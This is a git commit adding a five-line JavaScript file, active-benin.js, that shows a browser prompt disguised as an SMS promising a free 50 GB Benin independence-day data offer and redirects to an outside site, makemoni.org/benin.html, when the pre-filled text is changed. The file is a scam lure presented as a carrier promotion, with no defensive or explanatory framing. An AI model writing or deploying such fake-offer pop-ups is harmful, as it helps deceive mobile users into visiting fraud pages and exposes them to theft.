12c42d93fb75c1bd19375505915c4542fb92ff36
bestplugg <nsiukpe247@gmail.com>
2025-07-22 07:48:19 +0100

    Create active-benin.js

---
+++ active-benin.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir l'offre de célébration de la fête de l'indépendance du Bénin de 50 Go, appuyez sur OK pour activer maintenant ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://makemoni.org/benin.html';
+}
